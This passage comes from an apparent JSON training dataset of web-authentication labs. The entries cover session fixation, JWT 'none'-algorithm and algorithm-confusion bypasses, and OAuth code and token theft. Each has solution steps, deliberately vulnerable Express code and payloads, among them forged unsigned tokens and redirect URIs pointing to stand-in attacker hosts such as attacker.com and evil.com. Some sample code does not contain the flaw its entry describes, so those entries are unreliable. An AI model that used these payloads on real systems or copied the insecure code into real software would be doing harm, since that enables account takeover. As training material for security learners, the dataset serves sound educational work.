            "Use Burp Suite's Proxy and Intercept to inspect the login request and response to identify the session cookie assigned pre-authentication.",
            "Confirm that the same session cookie persists after a successful login, indicating the vulnerability.",
            "Craft a malicious link embedding the session ID in the cookie and deliver it to the victim (Carlos) via social engineering.",
            "Once Carlos logs in using the fixated session, reuse the same session ID in your browser to gain access to his authenticated session.",
            "Verify access by navigating to /my-account and confirming Carlos's account data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const crypto = require('crypto'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = { carlos: 'hunter2' }; app.use((req, res, next) => { if (!req.cookies.session) { const sessionId = crypto.randomBytes(4).toString('hex'); res.cookie('session', sessionId); } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { res.send('Login successful. Welcome ' + username); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { res.send('Account page for logged in user.'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
        "payloads": [
            "Set-Cookie: session=deadbeef;",
            "Inject fixated session ID via intercepted HTTP request before victim login.",
            "Share crafted malicious URL with embedded session parameter.",
            "Replay the fixed session post-victim login."
        ]
    },
    {
        "Lab scenario": "JWT token signature spoofing via 'none' algorithm",
        "Lab Description": "This lab uses JWT tokens for authentication but fails to properly enforce signature verification, accepting tokens with the algorithm field set to 'none'. The application trusts the header-supplied algorithm, allowing attackers to bypass authentication by supplying an unsigned token. To solve: forge a token for Carlos without needing the secret and log into his account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Use Burp Suite to capture a valid JWT token from your own account during login.",
            "Decode the JWT token using jwt.io or Burp Decoder to inspect its structure.",
            "Modify the 'alg' field in the header to 'none' and change the payload's username to 'carlos'.",
            "Remove the signature part entirely and re-encode the JWT token.",
            "Replay the modified token in the Authorization header and access /my-account to confirm successful login as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Unauthorized'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none' || jwt.verify(token, SECRET)) { res.send('Welcome ' + decoded.payload.username); } else { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on http://localhost:4000'));",
        "payloads": [
            "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
            "Payload: { \"username\": \"carlos\" }",
            "JWT token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
            "Authorization: Bearer [forged_token]"
        ]
    },
    {
        "Lab scenario": "OAuth2 token leakage via referrer header in third-party redirect",
        "Lab Description": "This lab demonstrates insecure OAuth2 token handling. After successful authorization, the application redirects users to a third-party site, leaking the token in the Referer header. Attackers can capture the token from this third-party service and reuse it. To solve: capture Carlos's leaked OAuth token and use it to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use Burp Suite's Proxy to capture the OAuth2 authorization flow and observe the 'Location' header on redirect.",
            "Identify the OAuth2 access token being appended as a query parameter during redirection to a third-party domain.",
            "Set up your own HTTP server to mimic the third-party service and intercept incoming requests with tokens.",
            "Send Carlos a crafted phishing link that triggers OAuth flow; once he logs in, the token will be sent to your server via the Referer header.",
            "Replay the intercepted token using Postman to authenticate as Carlos and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const tokens = { carlos: 'abc123token' }; app.get('/auth', (req, res) => { const { user } = req.query; const token = tokens[user]; res.redirect('http://third-party.com/welcome?access_token=' + token); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer abc123token') { res.send('Carlos Account Details'); } else { res.status(401).send('Unauthorized'); } }); app.listen(4000, () => console.log('OAuth Token Leak Lab running on http://localhost:4000'));",
        "payloads": [
            "Intercept Referer header during third-party redirect: access_token=abc123token",
            "Crafted phishing OAuth consent link: http://victim-app.com/auth?user=carlos",
            "Authorization: Bearer abc123token",
            "Replay token in Postman or Burp to access /my-account"
        ]
    },
    {
        "Lab scenario": "JWT signature spoof via algorithm confusion",
        "Lab Description": "This lab demonstrates an insecure JSON Web Token (JWT) validation implementation that incorrectly trusts the 'alg' header of incoming tokens. The application uses symmetric HMAC verification but allows switching the algorithm to 'none'. To solve: Craft a forged token to escalate to the 'admin' user and access the admin panel.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Use Burp Suite to intercept the JWT from a logged-in user request and decode it using jwt.io or Burp Decoder.",
            "Confirm the JWT structure and spot the 'alg' value set to 'HS256'. Change it to 'none' and remove the signature part.",
            "Manually edit the payload to replace your username with 'admin'.",
            "Send the modified token using Burp Repeater to authenticate as 'admin'.",
            "Visit the /admin route to verify successful privilege escalation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, secret); if (payload.username === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Access Denied'); } } catch (e) { res.status(401).send('Invalid Token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Spoof Lab running on http://localhost:${PORT}`));",
        "payloads": [
            "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
            "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0",
            "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
    },
    {
        "Lab scenario": "OAuth authorization code reuse",
        "Lab Description": "This lab's OAuth 2.0 flow is improperly designed, allowing an attacker to reuse a captured authorization code to hijack a user session. The application does not properly invalidate codes after first use. To solve: Steal and reuse a victim's authorization code to log in as that user.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use OWASP ZAP to proxy your login and capture the OAuth redirection flow.",
            "Analyze the authorization code grant flow, note the 'code' parameter in the URL.",
            "Intercept the victim's OAuth callback request and capture their 'code' value.",
            "Manually replay the callback request using the victim's code via Burp Repeater.",
            "Access the victim's account dashboard to confirm successful session hijack."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.urlencoded({ extended: true })); let sessions = {}; app.get('/oauth/callback', async (req, res) => { const code = req.query.code; if (!code) return res.status(400).send('No code provided'); try { const tokenResponse = await axios.post('https://auth-server/token', { code }); sessions[req.ip] = tokenResponse.data.user; res.redirect('/my-account'); } catch (err) { res.status(500).send('OAuth exchange failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.ip]; if (!user) return res.status(401).send('Not logged in'); res.send(`Welcome ${user}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Code Reuse Lab running on http://localhost:${PORT}`));",
        "payloads": [
            "/oauth/callback?code=stolen_code_value",
            "/oauth/callback?code=previously_valid_code",
            "/oauth/callback?code=reused_auth_code"
        ]
    },
    {
        "Lab scenario": "Session fixation via predictable session IDs",
        "Lab Description": "This lab simulates a session fixation vulnerability where the session identifier is predictable and not regenerated after login. The application uses user-controlled session IDs from URL parameters, allowing attackers to set a session ID before authentication. To solve: Fixate a session ID before login and hijack the authenticated session.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Use Postman to send a GET request to /login?sessionId=attacker123 before authentication.",
            "Send the same sessionId parameter to the victim in a phishing link and wait for them to log in.",
            "Once the victim logs in using the fixed session ID, send a GET /my-account request using the same sessionId cookie.",
            "Observe the response to confirm account takeover.",
            "Access /my-account to solve the lab and complete the session hijack."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': { password: 'password123', session: null } }; app.get('/login', (req, res) => { const { username, password, sessionId } = req.query; if (users[username] && users[username].password === password) { users[username].session = sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', users[username].session); res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.sessionId; const user = Object.keys(users).find(u => users[u].session === session); if (user) { res.send(`Account details for ${user}`); } else { res.send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
            "/login?username=carlos&password=password123&sessionId=attacker123",
            "/login?sessionId=attacker123",
            "Cookie: sessionId=attacker123"
        ]
    },
    {
        "Lab scenario": "Session Fixation vulnerability in login workflow",
        "Lab Description": "This lab's session management mechanism is flawed and allows session fixation attacks. The application issues session cookies prior to authentication and fails to assign new tokens upon successful login. To solve: Hijack Carlos's session by fixing the session identifier before he logs in, then access his account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Use Burp Suite to intercept the initial GET /login request and note the session cookie issued by the server.",
            "Send a crafted phishing email to Carlos or use social engineering to make him reuse the provided session ID for login.",
            "After Carlos authenticates using the fixed session ID, reuse the same session cookie in your own browser or API client.",
            "Confirm that you are now logged in as Carlos without providing any credentials.",
            "Visit /my-account while using the fixed session cookie to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'supersecret123' }; app.get('/login', (req, res) => { let sessionID = req.cookies.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionID); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionid] = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) { res.send('Welcome ' + user); } else { res.send('Not authenticated'); } }); app.listen(3000);",
        "payloads": [
            "Set-Cookie: sessionid=attackersession123;",
            "Use phishing email to send: https://victim.site/login with sessionid=attackersession123",
            "Reuse sessionid=attackersession123 after victim logs in"
        ]
    },
    {
        "Lab scenario": "JWT algorithm confusion vulnerability in token validation",
        "Lab Description": "This lab uses JSON Web Tokens (JWT) for session authentication but fails to enforce the correct cryptographic algorithm. An attacker can manipulate the token header to use 'none' as the algorithm and forge a valid session token. To solve: Forge a valid admin JWT and access the admin panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture a valid JWT during a login session using Burp Suite or OWASP ZAP.",
            "Modify the JWT header to { \"alg\": \"none\", \"typ\": \"JWT\" } and remove the signature portion.",
            "Craft a payload like { \"username\": \"admin\" } and base64-encode the header and payload.",
            "Send the forged JWT as a Bearer token in the Authorization header to /admin.",
            "Verify successful access to the admin panel to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'insecure-secret'; app.get('/login', (req, res) => { const username = req.query.username; const token = jwt.sign({ username: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.verify(token, secret); if (payload.username === 'admin') { res.send('Welcome admin'); } else { res.status(403).send('Access denied'); } } catch { res.status(400).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
            "Authorization: Bearer <header.payload.>",
            "Replace JWT in Cookie or Auth header with none-alg variant"
        ]
    },
    {
        "Lab scenario": "OAuth misconfiguration in third-party login flow",
        "Lab Description": "This lab's OAuth integration incorrectly trusts the 'state' parameter without proper validation. An attacker can intercept and modify this value to hijack authorization codes during the OAuth redirection. To solve: Manipulate the OAuth 'state' parameter to capture a valid authorization code and log in as Carlos.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept the OAuth login request with Burp Suite and observe the 'state' parameter in the redirect URL.",
            "Modify the 'state' parameter to a predictable or controlled value and replay the request.",
            "Use Burp Collaborator or a controlled server to catch the authorization code sent via redirect.",
            "Exchange the intercepted authorization code for an access token using Postman or curl.",
            "Submit the token to /my-account endpoint to confirm the hijack and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const { code, state } = req.query; if (!state || !code) return res.status(400).send('Invalid request'); res.cookie('session_token', code); res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const token = req.cookies.session_token; if (token === 'carlos_auth_code') { res.send('Welcome Carlos!'); } else { res.send('Unauthorized'); } }); app.listen(5000);",
        "payloads": [
            "https://target.site/auth/callback?code=carlos_auth_code&state=attacker",
            "Manipulate state to match known value: attacker123",
            "OAuth authorization code interception using Burp Collaborator"
        ]
    },
    {
        "Lab scenario": "JWT algorithm confusion vulnerability in session validation",
        "Lab Description": "This lab's authentication system uses JWTs for session management. The server uses the 'alg' field from the incoming token without proper validation, making it vulnerable to algorithm confusion. The application fails to enforce the intended HS256 signature verification when decoding JWTs, allowing attackers to switch the algorithm to 'none' and bypass signature verification entirely. To solve: Forge a valid session token for the user 'carlos' and access their account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept a valid login request using Burp Suite and capture the JWT from the Authorization header.",
            "Use jwt.io or a custom script to decode the JWT and note the 'alg' value is 'HS256'.",
            "Modify the header's 'alg' field to 'none' and remove the signature section entirely.",
            "Set the payload 'sub' to 'carlos' and re-encode the JWT without a signature.",
            "Replay the modified token using Postman in an Authorization header and access /my-account to confirm successful authentication."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET_KEY = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username }, SECRET_KEY, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && (!payload.header.alg || payload.header.alg === 'none' || jwt.verify(token, SECRET_KEY))) { res.send(`Welcome, ${payload.payload.sub}`); } else { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Lab running at http://localhost:4000'));",
        "payloads": [
            "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
            "{\"alg\":\"none\"}.{ \"sub\":\"carlos\" }.",
            "{\"alg\":\"none\",\"typ\":\"JWT\"}.{ \"sub\":\"carlos\" }."
        ]
    },
    {
        "Lab scenario": "OAuth redirect URI manipulation in authorization flow",
        "Lab Description": "The application implements OAuth 2.0 for single sign-on (SSO) but lacks proper validation of the redirect_uri parameter. An attacker can manipulate this parameter to hijack an OAuth authorization code meant for another user. The application incorrectly trusts any user-supplied redirect_uri pointing to the same domain. To solve: Trick the application into sending an OAuth code for the user 'carlos' to your controlled endpoint, then exchange it for an access token.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Using Burp Suite, initiate the OAuth login process and intercept the request containing the redirect_uri parameter.",
            "Modify the redirect_uri parameter to point to your controlled endpoint: https://attacker.com/callback.",
            "Send the phishing link to the victim (simulated in lab) and wait for the authorization code to be sent to your server.",
            "Use Postman to send a POST request to the OAuth provider's token endpoint with the stolen code and retrieve Carlos's access token.",
            "Replay the token against the /my-account API to access Carlos's protected resources."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { redirect_uri, code } = req.query; if (redirect_uri && code) { res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid request'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'valid-oauth-token-for-carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running at http://localhost:4000'));",
        "payloads": [
            "https://attacker.com/callback",
            "https://attacker.com/oauth/code-stealer",
            "https://attacker.com/evil?code=intercepted-code"
        ]
    },
    {
        "Lab scenario": "Session fixation vulnerability in login flow",
        "Lab Description": "This lab's session management logic fails to regenerate session tokens upon successful login. Attackers can fixate their own session ID and later reuse it to hijack authenticated user sessions. The application issues the session cookie before verifying user credentials, allowing the attacker to trick a victim into using the attacker's predefined session token. To solve: Fixate your session ID, trick the application into authenticating as Carlos, then reuse the session ID to access Carlos's account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Use Burp Suite to initiate a GET request to /login and capture the Set-Cookie header issuing a session ID.",
            "Send this session ID to the victim (simulated scenario) and wait for them to log in.",
            "Reattach the fixed session ID to your requests in Burp or Postman.",
            "Access the /my-account endpoint using the fixed session ID to verify that you're now logged in as 'carlos'.",
            "Confirm successful exploitation when Carlos's account details appear."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': 'hunter2', 'admin': 'adminpass' }; app.get('/login', (req, res) => { if (!req.cookies.session) { res.cookie('session', Math.random().toString(36).substr(2)); } res.send('Please log in.'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { res.send(`Logged in as ${username}`); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'fixed-session-for-carlos') { res.send('Account details for carlos'); } else { res.send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running at http://localhost:4000'));",
        "payloads": [
            "Cookie: session=fixed-session-for-carlos",
            "Set-Cookie: session=fixed-session-for-carlos",
            "fixed-session-for-carlos"
        ]
    },
    {
        "Lab scenario": "JWT algorithm confusion in authentication flow",
        "Lab Description": "This lab's authentication mechanism is vulnerable to JWT algorithm confusion. The application accepts JSON Web Tokens for authentication but fails to enforce the expected signing algorithm, allowing an attacker to switch from asymmetric RS256 to symmetric HS256. The application does not validate the secret when HS256 is used. To solve: forge a valid JWT for the user 'carlos' and access his account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Capture an authenticated JWT token using Burp Suite's Proxy tab after logging in as your own user.",
            "Inspect the token header and notice the 'alg' parameter is set to RS256. Modify it to HS256 and set the signature part to an HMAC using the public key as the secret.",
            "Use a JWT crafting tool like jwt.io or Burp Suite's Decoder to craft a forged token for username 'carlos'.",
            "Replace your original JWT with the forged one in an authenticated request to /my-account.",
            "If successful, the page will display Carlos's account data, confirming the token bypass."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const publicKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username }, publicKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); res.send(`Account details for ${decoded.username}`); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
            "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"} | Payload: {\"username\":\"carlos\"} | Signature: HMAC(publicKey, header.payload)",
            "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICJjYXJsb3MifQ.[HMAC signature]"
        ]
    },
    {
        "Lab scenario": "Session fixation via insecure cookie handling",
        "Lab Description": "This lab is vulnerable to session fixation due to improper handling of session cookies. The application accepts user-supplied session tokens and fails to regenerate them upon authentication. An attacker can set a known session ID before login, which will persist across privilege escalation. To solve: fix a session ID and log in as the victim user 'carlos' using the same session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Using OWASP ZAP, intercept the GET /login request and set a predictable session ID via Cookie header (e.g., PHPSESSID=attackerfixedid).",
            "Use the victim's credentials during login and observe that the session token remains unchanged after successful authentication.",
            "Reuse the fixed session ID to access /my-account directly using the same token.",
            "Confirm access to Carlos's profile with the fixed session ID.",
            "Use ZAP to confirm the same session persists across multiple requests, validating fixation success."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'qwerty123' }]; app.get('/login', (req, res) => { res.cookie('session', req.cookies.session || Math.random().toString(36).substring(2)); res.send('Please log in'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { res.send(`Account data for session ${req.cookies.session}`); }); app.listen(4000);",
        "payloads": [
            "Cookie: session=attackerfixedid",
            "Login POST: username=carlos&password=qwerty123 with Cookie: session=attackerfixedid",
            "GET /my-account with Cookie: session=attackerfixedid"
        ]
    },
    {
        "Lab scenario": "OAuth token misconfiguration in third-party login",
        "Lab Description": "This lab's OAuth login flow improperly trusts the 'sub' claim from a third-party provider without validating issuer or audience fields, allowing impersonation of other users. To solve: forge a valid ID Token with 'sub' set to Carlos and log in via OAuth to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use Postman to capture a legitimate OAuth authentication flow from the provider for your own account.",
            "Decode the JWT token using jwt.io and analyze the 'sub' field which defines the user identity.",
            "Manually craft a JWT with the 'sub' claim set to 'carlos' while reusing the same header and signing key (if known or guessable).",
            "Submit the forged ID Token to the applicationâ€™s OAuth callback endpoint to complete login as Carlos.",
            "Confirm by accessing the /my-account endpoint to verify account takeover."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/oauth/callback', (req, res) => { const idToken = req.body.id_token; const decoded = jwt.decode(idToken); if (!decoded || !decoded.sub) return res.status(401).send('Invalid ID token'); res.send(`Logged in as ${decoded.sub}`); }); app.listen(4000);",
        "payloads": [
            "Header: {\"alg\":\"HS256\"} | Payload: {\"sub\":\"carlos\"} | Signature: HMAC(secret, header.payload)",
            "eyJhbGciOiAiSFMyNTYifQ.eyJzdWIiOiAiY2FybG9zIn0.[Valid HMAC signature]"
        ]
    },
    {
        "Lab scenario": "Session Fixation via Pre-Login Cookie Reuse",
        "Lab Description": "The login flow of this web app allows a pre-authenticated session ID to persist after a successful login, leading to session fixation. The application does not regenerate session identifiers after login, allowing attackers to set a session beforehand. To solve: Hijack Carlos's session using a pre-set session ID cookie.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
          "Start Burp Suite and intercept the initial GET /login request to the site.",
          "Note the Set-Cookie header for session ID and manually fix it to a predictable value like 'sessionid=attacker123'.",
          "Send the crafted login link to Carlos (simulated by switching users) with the preset session ID cookie.",
          "Log in as Carlos using known credentials from a separate session but using the 'attacker123' session ID.",
          "Reuse the same session ID cookie in a browser and access /my-account to verify hijack success."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 's3cret' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.redirect('/my-account'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send('Welcome, ' + req.session.user); else res.status(403).send('Not authorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "Cookie: sessionid=attacker123",
          "GET /login HTTP/1.1 with pre-injected sessionid",
          "POST /login with valid credentials while sessionid=attacker123 is set"
        ]
      }
      ,
      {
        "Lab scenario": "JWT Algorithm Confusion in Authorization Header",
        "Lab Description": "The app uses JWTs for session management but does not enforce a strong algorithm check. It accepts unsigned tokens if the 'alg' header is modified to 'none'. The application verifies JWTs based on the 'alg' field without checking signature integrity. To solve: Forge an admin token using alg:none and access the admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Log in as a regular user and capture the Authorization: Bearer token using Burp Suite.",
          "Use jwt.io or Postman to decode the JWT and examine the 'alg' header.",
          "Craft a new token with the payload { \"username\": \"carlos\", \"role\": \"admin\" } and header { \"alg\": \"none\" }, without a signature.",
          "Inject the crafted JWT into the Authorization header.",
          "Send a GET /admin-dashboard request using the unsigned JWT to confirm admin access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); const secretKey = 'supersecret'; app.get('/admin-dashboard', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); const verified = jwt.verify(token, secretKey, { algorithms: [payload.header.alg] }); if (verified && verified.role === 'admin') { res.send('Welcome to admin dashboard'); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
        "payloads": [
          "Header: { \"alg\": \"none\" }",
          "Payload: { \"username\": \"carlos\", \"role\": \"admin\" }",
          "JWT: [base64url(header)].[base64url(payload)]. (no signature)",
          "Authorization: Bearer [forged-token]"
        ]
      }
      ,
      {
        "Lab scenario": "OAuth Implicit Flow Token Leakage in Redirect URL",
        "Lab Description": "The web application uses the OAuth 2.0 implicit flow and allows open redirection in the redirect_uri parameter. This enables token leakage through an attacker-controlled URL. The application trusts user-controlled redirect URIs without validating the domain. To solve: Leak Carlos's token to an attacker domain and use it to access his profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to inspect the OAuth login process and locate the 'redirect_uri' parameter in the authorization request.",
          "Craft a malicious URL with redirect_uri pointing to an attacker-controlled site (e.g., https://evil.com/capture).",
          "Send the malicious OAuth link to Carlos (simulate by visiting the link yourself with Carlos logged in).",
          "Capture the access_token fragment in the redirect to https://evil.com/capture#access_token=... using a local HTTP server or webhook.site.",
          "Replay the stolen token in the Authorization: Bearer header to access /user-profile as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'carlos-oauth-token'; res.redirect(redirectUri + '#access_token=' + token); }); app.get('/user-profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'carlos-oauth-token') res.send('Welcome Carlos'); else res.status(403).send('Invalid token'); }); app.listen(5000, () => console.log('OAuth Redirect Lab running'));",
        "payloads": [
          "https://vulnerable.com/auth?redirect_uri=https://evil.com/capture",
          "Authorization: Bearer carlos-oauth-token",
          "Access_token extracted from redirect URI fragment",
          "OAuth implicit flow token replay"
        ]
      }
      ,
      {
        "Lab scenario": "Session fixation in URL parameter during login",
        "Lab Description": "The application implements a flawed session handling mechanism that accepts user-provided session IDs via URL query parameters. When users log in, the session ID from the URL is reused, allowing attackers to predefine a session and force victims to use it. To solve: Hijack Carlos's session by crafting a valid login link that fixes the session ID.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept the login process and observe that the session ID can be passed via GET /login?session=abc123",
          "Send the request to Burp Repeater and confirm that the application sets the provided session ID in the Set-Cookie header after login",
          "Craft a login URL with a fixed session ID and send it to the victim (Carlos)",
          "Wait for Carlos to log in using the malicious session ID",
          "Access /my-account using the same session ID and verify that youâ€™re logged in as Carlos"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { if (req.query.session) { req.sessionID = req.query.session; } res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { req.session.user = req.body.username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account details for ${req.session.user}`); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "/login?session=abc123",
          "abc123",
          "GET /my-account Cookie: connect.sid=abc123"
        ]
      }
      ,
      {
        "Lab scenario": "JWT authentication bypass via 'none' algorithm",
        "Lab Description": "The application uses JSON Web Tokens (JWT) for authentication. It trusts the 'alg' header of incoming tokens without validation. If the algorithm is set to 'none', the server skips signature verification. To solve: Forge a JWT token with 'none' algorithm to gain access to Carlos's account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to capture a valid JWT token after login",
          "Decode the JWT token using jwt.io or Burp JWT editor",
          "Modify the payload to impersonate user 'carlos' and set 'alg' to 'none' in the header",
          "Remove the signature completely and base64 encode the new token",
          "Send a request to /my-account with Authorization: Bearer [forged-token] and verify access"
        ],
        "Vulnerability name": "Authentication",
